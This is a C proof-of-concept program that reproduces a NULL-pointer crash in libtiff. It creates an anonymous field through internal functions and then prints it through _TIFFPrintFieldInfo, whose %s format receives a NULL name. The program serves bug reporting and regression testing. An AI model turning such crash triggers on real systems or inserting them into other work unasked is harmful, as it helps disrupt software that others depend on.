#include <stdio.h>
#include <stdint.h>
#include <tiffio.h>

/* Forward declarations of internal libtiff functions involved in the bug */
extern const TIFFField *_TIFFCreateAnonField(TIFF *tif, uint32_t tag, TIFFDataType type);
extern int _TIFFMergeFieldInfo(TIFF *tif, const TIFFField *info, uint32_t n);
extern void _TIFFPrintFieldInfo(TIFF *tif, FILE *fd);

/* Minimal stubbed I/O callbacks for TIFFClientOpen to avoid filesystem I/O */
static tmsize_t mem_read(thandle_t fd, void *buf, tmsize_t size) {
    (void)fd; (void)buf; (void)size; return 0; /* nothing to read */
}
static tmsize_t mem_write(thandle_t fd, void *buf, tmsize_t size) {
    (void)fd; (void)buf; return size; /* pretend we wrote everything */
}
static toff_t mem_seek(thandle_t fd, toff_t off, int whence) {
    (void)fd; (void)whence; return off; /* naive seek */
}
static int mem_close(thandle_t fd) {
    (void)fd; return 0;
}
static toff_t mem_size(thandle_t fd) {
    (void)fd; return 0;
}
static int mem_map(thandle_t fd, void **base, toff_t *size) {
    (void)fd; if (base) *base = NULL; if (size) *size = 0; return 0; /* fail mapping */
}
static void mem_unmap(thandle_t fd, void *base, toff_t size) {
    (void)fd; (void)base; (void)size;
}

int main(void) {
    /* Create a TIFF handle using in-memory stubs (no real file I/O) */
    TIFF *tif = TIFFClientOpen("mem", "w", NULL,
                               mem_read, mem_write, mem_seek,
                               mem_close, mem_size, mem_map, mem_unmap);
    if (!tif) {
        fprintf(stderr, "Failed to open in-memory TIFF\n");
        return 1;
    }

    /* Create an anonymous field: field_name will be NULL */
    const uint32_t unknown_tag = 65000; /* pick a tag unlikely to be predefined */
    const TIFFField *anon = _TIFFCreateAnonField(tif, unknown_tag, TIFF_LONG);
    if (!anon) {
        fprintf(stderr, "Failed to create anonymous field\n");
        TIFFClose(tif);
        return 1;
    }

    /* Merge the anonymous field into the TIFF's field list */
    (void)_TIFFMergeFieldInfo(tif, anon, 1);

    /* Trigger the vulnerable code path: prints field_name via %s, which is NULL */
    _TIFFPrintFieldInfo(tif, stdout);

    /* Normally unreachable if crash occurs */
    TIFFClose(tif);
    return 0;
}
